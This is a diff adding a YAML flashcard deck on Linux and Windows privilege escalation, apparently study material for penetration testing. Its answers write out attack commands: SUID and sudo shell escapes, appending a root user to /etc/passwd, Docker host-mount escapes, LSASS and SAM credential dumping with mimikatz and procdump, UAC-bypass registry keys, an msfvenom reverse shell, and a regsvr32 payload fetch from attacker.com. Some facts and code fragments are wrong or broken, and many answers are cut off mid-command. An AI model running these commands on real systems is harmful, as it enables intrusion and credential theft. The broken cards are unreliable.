@@ -1,0 +1,403 @@
+title: Privilege Escalation
+description: Linux and Windows privilege escalation — kernel exploits, SUID, sudo, services, tokens, credentials
+cards:
+- question: What command shows the Linux kernel version for exploit research?
+  answer: uname -a
+- question: What tool automates finding kernel exploits for a given Linux system?
+  answer: linux-exploit-suggester.sh (LES.sh)
+- question: Which kernel exploit (CVE-2022-0847) allows overwriting read-only files via a pipe?
+  answer: Dirty Pipe
+- question: Which kernel exploit (CVE-2016-5195) enables race-condition-based privilege escalation via copy-on-write?
+  answer: Dirty Cow
+- question: What type of kernel exploit abuses union mounts in Linux?
+  answer: OverlayFS exploit
+- question: What command finds all SUID binaries on Linux?
+  answer: find / -perm -4000 2>/dev/null
+- question: What website lists techniques for abusing SUID/SGID binaries?
+  answer: GTFOBins (gtfobins.github.io)
+- question: How can `find` with SUID escalate to root?
+  answer: find . -exec /bin/sh -p \; -quit
+- question: What flag with `find` preserves the effective UID when spawning a shell?
+  answer: -p (on /bin/sh -p)
+- question: How can `nmap` with SUID spawn an interactive shell?
+  answer: nmap --interactive then !sh or echo 'os.execute' > /tmp/shell.nse && nmap...
+- question: How can `vim` with SUID escalate privileges?
+  answer: vim -c ':!/bin/sh' or :python import os; os.system('/bin/sh')
+- question: How can `bash` with SUID drop to a shell with effective UID preserved?
+  answer: /bin/bash -p
+- question: How can `less` with SUID read any file or spawn a shell?
+  answer: In less type !/bin/sh and press Enter
+- question: How can `more` with SUID be used to read files or spawn a shell?
+  answer: Open a large file with more, then type !/bin/sh
+- question: How can `cp` with SUID be abused?
+  answer: cp /etc/shadow /tmp/; edit; cp back to /etc/shadow
+- question: How can `mv` with SUID be abused?
+  answer: Rename /etc/passwd to a backup, copy a crafted passwd in its place
+- question: How can `python` with SUID spawn a root shell?
+  answer: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+- question: How can `perl` with SUID spawn a root shell?
+  answer: perl -e 'exec "/bin/sh";'
+- question: How can `awk` with SUID spawn a shell?
+  answer: awk 'BEGIN {system("/bin/sh")}'
+- question: How can `sed` with SUID spawn a shell?
+  answer: sed -n '1e exec /bin/sh' /etc/passwd
+- question: How can `xxd` with SUID be abused?
+  answer: xxd /etc/shadow | xxd -r > /tmp/shadow; edit then xxd -r back
+- question: How can `base64` with SUID read sensitive files?
+  answer: base64 /etc/shadow | base64 -d
+- question: How can `env` with SUID spawn a shell?
+  answer: env /bin/sh -p
+- question: How can `busybox` with SUID spawn a shell?
+  answer: busybox sh -p
+- question: How can `docker` with SUID or docker group membership escalate to root?
+  answer: docker run -v /:/mnt -it alpine chroot /mnt sh
+- question: How can `screen` with SUID be abused?
+  answer: screen -x (attach to existing session as root)
+- question: How can `tmux` with SUID be abused?
+  answer: tmux -S /tmp/root_socket attach (if a root tmux session exists)
+- question: What command lists sudo privileges for the current user?
+  answer: sudo -l
+- question: What CVE allows running commands as root with sudo when the user is specified as ALL?
+  answer: CVE-2019-14287 (sudo -u#-1 /bin/sh)
+- question: What CVE is the Baron Samedit heap buffer overflow in sudo (affecting sudo < 1.8.31)?
+  answer: CVE-2021-3156
+- question: How do you check if a system is vulnerable to CVE-2021-3156 (Baron Samedit)?
+  answer: sudoedit -s / (if it responds with 'sudoedit:') the system is likely vulnerable
+- question: What environment variable can be used with sudo to load a custom shared library?
+  answer: LD_PRELOAD (when env_keep includes LD_PRELOAD)
+- question: How do you exploit LD_PRELOAD with sudo?
+  answer: Write a malicious .so file with __attribute__), set LD_PRELOAD=/tmp/malicious.so, and run a...
+- question: What sudoers configuration must be present for LD_PRELOAD abuse?
+  answer: env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH in sudoers
+- question: How can GTFOBins help with sudo abuse?
+  answer: GTFOBins provides 'sudo' categories showing exploitation commands for binaries runnable via...
+- question: What command lists cron jobs for all users on Linux?
+  answer: ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
+- question: How can a writable cron script be exploited?
+  answer: Write a reverse shell or privilege escalation payload into the script owned by the target user
+- question: What is wildcard injection in cron tar commands?
+  answer: tar -cf archive.tar * will expand flags in filenames, e.g., --checkpoint=1...
+- question: How do you exploit a cron job running tar with a wildcard?
+  answer: Create files named `--checkpoint=1` and `--checkpoint-action=exec=shell.sh` in the archive...
+- question: How do you exploit a cron job running rsync with a wildcard?
+  answer: Create a file named `-e sh shell.sh` or use rsync-specific wildcard flags to execute...
+- question: What is PATH abuse in cron jobs?
+  answer: If a cron job runs a command without an absolute path and the PATH is writable, place a...
+- question: Where should a malicious binary be placed for cron PATH abuse?
+  answer: In a directory earlier in the cron job's PATH than the original binary location
+- question: How do you check cron logs for scheduled jobs?
+  answer: grep CRON /var/log/syslog or /var/log/cron
+- question: What does the Docker socket (/var/run/docker.sock) ownership give you?
+  answer: Full access to the Docker daemon, allowing container creation with host filesystem mounts
+- question: How do you escape a Docker container with --privileged flag?
+  answer: Mount /dev and access the host disk devices directly, or use nsenter with host PID namespace
+- question: What Linux capability allows a container to mount filesystems and perform sysadmin operations?
+  answer: CAP_SYS_ADMIN
+- question: How do you abuse CAP_SYS_ADMIN in a container to escape?
+  answer: mount -t cgroup -o memory cgroup /tmp/cgroup && mkdir /tmp/cgroup/x && echo 1 >...
+- question: What command checks file capabilities on Linux?
+  answer: getcap -r / 2>/dev/null
+- question: What command sets a Linux capability on a binary?
+  answer: setcap cap_xyz+ep /path/to/binary
+- question: What capability allows a binary to bypass all file read permission checks?
+  answer: CAP_DAC_READ_SEARCH
+- question: What capability allows a binary to bypass all file permission checks?
+  answer: CAP_DAC_OVERRIDE
+- question: What capability allows setting arbitrary UIDs?
+  answer: CAP_SETUID
+- question: What capability allows changing file ownership?
+  answer: CAP_CHOWN
+- question: What capability allows network admin operations?
+  answer: CAP_NET_ADMIN
+- question: How do you exploit /etc/passwd being writable?
+  answer: Generate a password hash with 'openssl passwd -1 newpass', replace root's password hash, or...
+- question: How do you generate a password hash with openssl?
+  answer: openssl passwd -6 -salt xyz password or openssl passwd -1 password
+- question: How do you add a root-privilege user to a writable /etc/passwd?
+  answer: echo 'newuser:hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+- question: How does PATH hijacking work for privilege escalation?
+  answer: If a setuid script or program invokes a command without a full path, substituting a...
+- question: What command shows exported NFS shares?
+  answer: showmount -e target_ip
+- question: How does NFS no_root_squash enable privilege escalation?
+  answer: Mount the export as root from a client; files created with UID 0 retain root ownership,...
+- question: What is the default NFS root squashing behavior?
+  answer: root_squash (maps root UID to nobody/nfsnobody)
+- question: What command uploads your SSH public key to a remote server's authorized_keys?
+  answer: ssh-copy-id user@host; or manually append ~/.ssh/id_rsa.pub to ~user/.ssh/authorized_keys
+- question: What is SSH agent forwarding and how can it be abused?
+  answer: Agent forwarding allows a remote server to use your local SSH agent; an attacker with root...
+- question: Where is the SSH agent socket typically located?
+  answer: $SSH_AUTH_SOCK (usually /tmp/ssh-XXXXXX/agent.XXXX)
+- question: What is PAM and how might it be abused for privesc?
+  answer: Pluggable Authentication Modules; writable PAM configuration or backdoored pam_unix.so can...
+- question: How does LD_LIBRARY_PATH abuse work?
+  answer: Set LD_LIBRARY_PATH to a writable directory containing a malicious version of a shared...
+- question: How can you hijack a tmux or screen session of another user?
+  answer: Check /tmp for tmux sockets or list screen sessions
+- question: How does ptrace abuse enable privilege escalation?
+  answer: If you can ptrace a process running as root, you can inject shellcode or modify memory to...
+- question: What Yama security mechanism restricts ptrace?
+  answer: /proc/sys/kernel/yama/ptrace_scope (0=all, 1=restricted, 2=admin-only, 3=no attach)
+- question: How can /proc race conditions be exploited for privesc?
+  answer: TOCTOU races on /proc/self/fd/, /proc/self/mem, or /proc/self/exe where file permissions...
+- question: How can you escape a restricted shell (rbash)?
+  answer: Use commands with absolute paths, spawn a different shell'), or exploit EDITOR/VISUAL env...
+- question: How can you escape rksh (restricted ksh)?
+  answer: Set ENV to a script or use cp to copy /bin/ksh and run unrestricted
+- question: What is rssh and how do you escape it?
+  answer: Restricted SSH shell; escapes include scp -S, rsync with command execution, or specifying a...
+- question: How does PYTHONPATH abuse enable privesc?
+  answer: If a script imports a module, placing a malicious .py file with the same module name in a...
+- question: How does PERL5LIB abuse work?
+  answer: Similar to PYTHONPATH — set PERL5LIB to a writable directory containing a malicious .pm...
+- question: How does RUBYOPT abuse work?
+  answer: Set RUBYOPT to '-r malicious' to load a malicious Ruby file before the intended script executes
+- question: How does NODE_PATH abuse work?
+  answer: Set NODE_PATH to a writable directory; Node.js will look there first when resolving require...
+- question: What is the LXD group escalation technique?
+  answer: If the user is in the lxd group, run 'lxc init ubuntu:16.04 privesc -c...
+- question: What is the LXC group escalation technique?
+  answer: Similar to LXD — use lxc-create with a privileged configuration that mounts the host root...
+- question: What is systemd timer abuse for privesc?
+  answer: If a user can write to a systemd timer unit or the script it invokes, adding a reverse...
+- question: What command lists systemd timers?
+  answer: systemctl list-timers --all
+- question: Where are user-specific systemd timer units stored?
+  answer: ~/.config/systemd/user/ (also /etc/systemd/system/ for system timers)
+- question: How does AppArmor restrict privilege escalation?
+  answer: AppArmor profiles limit what resources a process can access even if running as root;...
+- question: How does SELinux context affect privilege escalation?
+  answer: SELinux enforces mandatory access; even with root you may be constrained to a domain that...
+- question: What command checks current SELinux status?
+  answer: getenforce; sestatus
+- question: How can you escape a restricted Python environment?
+  answer: Use __import__.system, or break out via code objects.__class__.__bases__[0].__subclasses__)
+- question: What is the Docker socket privilege escalation path?
+  answer: 'Access to /var/run/docker.sock allows running containers with host mounts: docker run -v...'
+- question: How does CAP_SYS_ADMIN in a container allow cgroup escape?
+  answer: Mount a cgroup controller, write to release_agent, then trigger the cgroup to execute the...
+- question: What command pipes shell shocker exploit from exploit-suggester?
+  answer: curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit...
+- question: What is CVE-2021-4034 (pwnkit) and how does it work?
+  answer: memory corruption in pkexec that allows any unprivileged user to gain root by running...
+- question: What does windows-exploit-suggester do?
+  answer: It compares systeminfo output against a vulnerability database to find missing Windows patches
+- question: What does Watson (or Watson++ / Sherlock) do for Windows?
+  answer: Scans local Windows system for missing privilege escalation patches using PowerShell
+- question: What CVE is MS08-067?
+  answer: A critical Windows Server Service RPC vulnerability allowing remote code execution as SYSTEM
+- question: What CVE is MS17-010 (EternalBlue)?
+  answer: A Windows SMB remote code execution vulnerability exploited by the WannaCry ransomware
+- question: What is an unquoted service path vulnerability?
+  answer: If a service binary path has spaces and is unquoted, Windows will attempt to execute each...
+- question: How do you exploit an unquoted service path?
+  answer: Place a malicious executable in the first writable directory matching the path prefix, then...
+- question: What command queries a Windows service's configuration?
+  answer: sc qc ServiceName
+- question: What command modifies a Windows service's binary path?
+  answer: sc config ServiceName binPath= "C:\malicious.exe"
+- question: What tool from Sysinternals checks service permissions?
+  answer: accesschk.exe -uwcqv "Users" * (checks writable services)
+- question: What PowerShell script finds service misconfigurations for privesc?
+  answer: PowerUp.ps1 (Invoke-AllChecks)
+- question: What C# tool finds Windows privilege escalation vectors?
+  answer: SharpUp.exe
+- question: What registry key enables AlwaysInstallElevated?
+  answer: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated and...
+- question: How do you exploit AlwaysInstallElevated?
+  answer: 'Generate a malicious MSI that runs as SYSTEM: msfvenom -p windows/meterpreter/reverse_tcp...'
+- question: What registry Run keys start programs at user logon?
+  answer: HKLM\Software\Microsoft\Windows\CurrentVersion\Run and...
+- question: Where is the Startup folder for all users?
+  answer: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+- question: Where is the Startup folder for the current user?
+  answer: C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+- question: What command lists scheduled tasks on Windows?
+  answer: schtasks /query /fo LIST /v
+- question: How can scheduled tasks be abused for privesc?
+  answer: If a task runs as SYSTEM and the task binary/script is writable, replace it with a payload
+- question: What is SeImpersonatePrivilege and how is it exploited?
+  answer: Allows impersonating a user after obtaining their token; exploited via Potato family...
+- question: What is JuicyPotato?
+  answer: Exploits SeImpersonate/SeAssignPrimaryToken to abuse DCOM activation and get a SYSTEM token
+- question: What is RoguePotato?
+  answer: variant of JuicyPotato that uses an OXID resolver to get SYSTEM impersonation without...
+- question: What is PrintSpoofer?
+  answer: Exploits the Windows Print Spooler to abuse SeImpersonatePrivilege and obtain SYSTEM token
+- question: What is GodPotato?
+  answer: Exploits SeImpersonate via the Windows Storage Service to achieve SYSTEM privileges
+- question: What is EfsPotato?
+  answer: Uses the Encrypting File System (EFSRPC) to abuse SeImpersonatePrivilege
+- question: What does SeAssignPrimaryTokenPrivilege allow?
+  answer: Assigns a primary token to a process, often used with SeImpersonate in Potato attacks
+- question: What does SeBackupPrivilege allow?
+  answer: Read any file regardless of ACL, including SAM and SYSTEM registry hives
+- question: How do you exploit SeBackupPrivilege?
+  answer: Use reg save or robocopy to back up SAM/SYSTEM hives, then extract hashes offline
+- question: What does SeRestorePrivilege allow?
+  answer: Write any file regardless of ACL, enabling replacement of critical system files
+- question: How do you exploit SeRestorePrivilege?
+  answer: Replace a service DLL or system binary with a malicious version, then trigger execution
+- question: What does SeDebugPrivilege allow?
+  answer: Debug any process, including LSASS — allows memory dumping and credential extraction
+- question: How do you exploit SeDebugPrivilege?
+  answer: Use procdump.exe -ma lsass.exe lsass.dmp or mimikatz sekurlsa::minidump with a debug handle...
+- question: What does SeTakeOwnershipPrivilege allow?
+  answer: Take ownership of any securable object regardless of ACL
+- question: How do you exploit SeTakeOwnershipPrivilege?
+  answer: Take ownership of a protected file, modify DACL, then read/replace
+- question: What does SeLoadDriverPrivilege allow?
+  answer: Load and unload device drivers, potentially enabling kernel-mode code execution
+- question: What is a CMSTP UAC bypass?
+  answer: Uses the Microsoft Connection Manager Profile Installer to auto-elevate without UAC prompt...
+- question: What is the eventvwr UAC bypass?
+  answer: HKCU\Software\Classes\mscfile\shell\open\command set to a malicious binary; eventvwr.exe...
+- question: What is the fodhelper UAC bypass?
+  answer: HKCU\Software\Classes\ms-settings\shell\open\command set to a malicious binary;...
+- question: What is the diskcleanup UAC bypass?
+  answer: HKCU\Software\Microsoft\Windows\CurrentVersion\explorer\Advanced\Start_TrackProgs set to 0...
+- question: What is the silentcleanup UAC bypass?
+  answer: HKCU\Software\Classes\ms-settings\shell\open\command set to payload, triggered by...
+- question: What is the slui UAC bypass?
+  answer: Set HKCU\Software\Classes\exefile\shell\open\command; slui.exe auto-elevates and executes...
+- question: Where are the SAM and SYSTEM registry hives stored?
+  answer: C:\Windows\System32\config\SAM and C:\Windows\System32\config\SYSTEM
+- question: How do you dump SAM hashes from registry?
+  answer: reg save hklm\sam sam.save && reg save hklm\system system.save && secretsdump.py -sam...
+- question: How does Mimikatz dump LSASS credentials?
+  answer: mimikatz privilege::debug sekurlsa::logonpasswords
+- question: What is procdump LSASS dumping?
+  answer: procdump.exe -accepteula -ma lsass.exe lsass.dmp; transfer to attacker machine and run...
+- question: How can comsvcs.dll be used to dump LSASS?
+  answer: rundll32 C:\Windows\System32\comsvcs.dll, MiniDump lsass_pid lsass.dmp full
+- question: How do you dump LSASS via Task Manager?
+  answer: Right-click lsass.exe in Task Manager (details tab) and select Create dump file (GUI method)
+- question: What is DPAPI and how is it abused?
+  answer: Windows Data Protection API; master keys and credential blobs can be decrypted with Mimikatz
+- question: Where are DPAPI master keys stored?
+  answer: C:\Users\Username\AppData\Roaming\Microsoft\Protect\{SID}\
+- question: Where does Windows Credential Manager store credentials?
+  answer: C:\Users\Username\AppData\Local\Microsoft\Credentials\ and vaultcmd /list
+- question: How do you extract Credential Manager passwords?
+  answer: mimikatz dpapi::cred /in:C:\Users\User\AppData\Local\Microsoft\Credentials\filename
+- question: How do you list saved WiFi passwords on Windows?
+  answer: netsh wlan show profiles && netsh wlan show profile name="SSID" key=clear
+- question: What is DLL hijacking?
+  answer: Placing a malicious DLL in the search path that an application loads before the legitimate DLL
+- question: What is Windows DLL search order?
+  answer: 1) Application directory, 2) System32, 3) 16-bit system dir, 4) Windows dir, 5) Current...
+- question: What is SafeDllSearchMode?
+  answer: When enabled (default), the current directory is moved after System32 in the search order
+- question: What tool identifies missing DLLs for hijacking?
+  answer: Procmon (Process Monitor) filtering on NAME_NOT_FOUND for DLL loads
+- question: How does GPO abuse lead to local admin?
+  answer: If a domain user can modify a GPO applied to a machine, adding a logon script or startup...
+- question: What command lists members of the local Administrators group?
+  answer: net localgroup Administrators
+- question: What command shows all groups the current user belongs to?
+  answer: whoami /groups
+- question: What is AppLocker and how can it be bypassed?
+  answer: Application whitelisting policy; bypasses include executing from alternate directories,...
+- question: What is PowerShell Constrained Language Mode and how do you bypass it?
+  answer: security mode that limits PowerShell; bypass via reflection, downloading an unconstrained...
+- question: What does 'powershell -Version 2' do for bypass?
+  answer: Runs PowerShell v2 which doesn't support Constrained Language Mode or AMSI (if v2 is available)
+- question: What is WMIC and how can it be used for command execution?
+  answer: wmic /node:target /user:admin /password:pass process call create "cmd.exe /c whoami"
+- question: What is CIM command execution?
+  answer: Invoke-CimMethod -ComputerName target -ClassName Win32_Process -MethodName Create...
+- question: Where is PowerShell history stored?
+  answer: C:\Users\Username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_histor...
+- question: Where are PowerShell transcripts saved?
+  answer: Start-Transcript output; default location varies but often C:\Transcripts\ or user's...
+- question: How can PowerShell module logging be abused?
+  answer: Logs may contain plaintext commands and credentials; check...
+- question: How do you extract saved RDP credentials?
+  answer: cmdkey /list (shows saved targets) then use Mimikatz or Credential Manager to extract
+- question: Where are RDP connection files stored?
+  answer: C:\Users\Username\Documents\Default.rdp and .rdp files; credentials may be embedded as hash...
+- question: What does 'cmdkey /list' show?
+  answer: Stored credentials (generic and domain); credentials can be used with runas /savecred
+- question: How do you abuse saved credentials with runas?
+  answer: runas /user:DOMAIN\Admin /savecred "cmd.exe /c whoami"
+- question: What is CVE-2019-14287 in sudo?
+  answer: sudo -u#-1 command bypasses the ALL privilege specification, allowing root command execution
+- question: What is CVE-2021-3156 exploit technique?
+  answer: Heap overflow in sudoedit; compile the exploit and run with sudoedit -s to gain root
+- question: What is a writable /etc/shadow attack?
+  answer: Remove root's password hash, leaving the password field empty, allowing su with no password
+- question: How do you exploit a writable /etc/environment?
+  answer: Set LD_PRELOAD or modify PATH for all users; triggers on next login
+- question: What does /etc/sudoers.d/ allow?
+  answer: Drop-in configuration files that grant sudo privileges; writable .d directory allows adding...
+- question: What is CVE-2010-3847 (glibc LD_AUDIT)?
+  answer: LD_AUDIT environment variable abuse on setuid binaries via a crafted $ORIGIN/rpath in ld.so
+- question: How can you use service failure recovery for privesc?
+  answer: sc failure flag ServiceName command= "cmd.exe /c net localgroup Administrators user /add"...
+- question: What is the Windows service recovery action?
+  answer: When a service crashes, Windows can run a program; if the action runs as SYSTEM, it's an...
+- question: What are weak service permissions?
+  answer: If a non-admin user has SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS on a service, they can...
+- question: How do you check service permissions with accesschk?
+  answer: accesschk.exe -uwcqv "Authenticated Users" * (shows services where users have write access)
+- question: What does 'sudo -l' show about LD_PRELOAD?
+  answer: If output includes 'env_reset' but 'env_keep' includes LD_PRELOAD; then LD_PRELOAD is...
+- question: What are modprobe_path and how is it abused?
+  answer: /proc/sys/kernel/modprobe_path defines binary called on unknown kernel module; if writable,...
+- question: What is /sys/kernel/uevent_helper abuse?
+  answer: If writable, set /sys/kernel/uevent_helper to a malicious script path and trigger a uevent...
+- question: How can an NFS insecure export be identified?
+  answer: cat /etc/exports on the NFS server or showmount -e from a client shows insecure options...
+- question: How do you exploit a SUID cp binary?
+  answer: cp /dev/stdin /etc/passwd (pipe crafted passwd entry) or cp /etc/shadow /tmp/ shadow copy
+- question: What is SeShutdownPrivilege and how can it be abused?
+  answer: Shut down the system; combined with service recovery actions or startup scripts to trigger...
+- question: What is CVE-2023-0386 (OverlayFS)?
+  answer: Linux kernel bug in OverlayFS that allows unprivileged users to copy-up files with setuid...
+- question: What is CVE-2021-3493 (OverlayFS)?
+  answer: Linux kernel overlayfs bug allowing any unprivileged user to gain root by exploiting a...
+- question: What does 'chkconfig --list' show on older Linux?
+  answer: Lists all services and their runlevels (SysV init); shows which services start at boot
+- question: How does 'docker --privileged' enable container escape?
+  answer: Grants all capabilities including SYS_ADMIN and device access; nsenter --target 1 --mount...
+- question: What is the service binary hijacking attack?
+  answer: Find a service running as SYSTEM with a writable binary path; replace the binary with a...
+- question: What command controls Windows service start/stop?
+  answer: net start/stop ServiceName or sc start/stop ServiceName
+- question: What is the Windows Token Kidnapping attack?
+  answer: Steal a primary/impersonation token from a SYSTEM process using DuplicateHandle and...
+- question: How do you use Invoke-TokenManipulation?
+  answer: Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"
+- question: What is the difference between SeBackup and SeRestore?
+  answer: SeBackup reads any file (backup semantics), SeRestore writes any file (restore semantics)
+- question: How does the Windows Store (UWPHost) UAC bypass work?
+  answer: Leverages the Desktop App Installer or the Microsoft Edge elevation to launch commands as...
+- question: What is the fodhelper UAC bypass registry key?
+  answer: HKCU\Software\Classes\ms-settings\shell\open\command = malicious.exe and DelegateExecute=
+- question: How do you bypass AppLocker with InstallUtil?
+  answer: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=...
+- question: How do you bypass AppLocker with mshta?
+  answer: mshta.exe javascript:new ActiveXObject('WScript.Shell').Run('cmd.exe',0,false)
+- question: How do you bypass AppLocker with regsvr32?
+  answer: regsvr32 /u /s /i:http://attacker.com/payload.sct scrobj.dll
+- question: How do you find binaries with capabilities on Linux?
+  answer: getcap -r / 2>/dev/null
+- question: What command lists all Docker containers (running and stopped)?
+  answer: docker ps -a
+- question: How do you mount host filesystem from a Docker container using the Docker socket?
+  answer: docker run -v /:/hostroot -it ubuntu chroot /hostroot bash
+- question: What is the 'escape_to_host' technique from a container with SYS_PTRACE?
+  answer: Use nsenter or compile a small binary using ptrace to attach to host PID 1 and run commands
+- question: What does Linux capability CAP_NET_RAW allow?
+  answer: Raw sockets — allows crafting arbitrary packets, potentially for ARP spoofing or packet...
+- question: What does CAP_SYS_PTRACE allow in a container?
+  answer: Trace any process — allows attaching to host processes if the container shares the PID...
+- question: What is the 'authorized_keys' SSH persistence technique?
+  answer: If SSH authorized_keys is writable, append the attacker's public key for passwordless root...
+- question: How do you check for SSH authorized_keys write access?
+  answer: 'ls -la ~/.ssh/authorized_keys; also check root''s: ls -la /root/.ssh/authorized_keys'
+- question: What is the suid3m / suid3num.py tool?
+  answer: PowerShell script that enumerates SUID binaries, capabilities, cron jobs, and other Linux...
+- question: What is the 'checksec' command used for?
+  answer: Checks binary security properties (NX, stack canary, PIE, RELRO) to identify exploitability
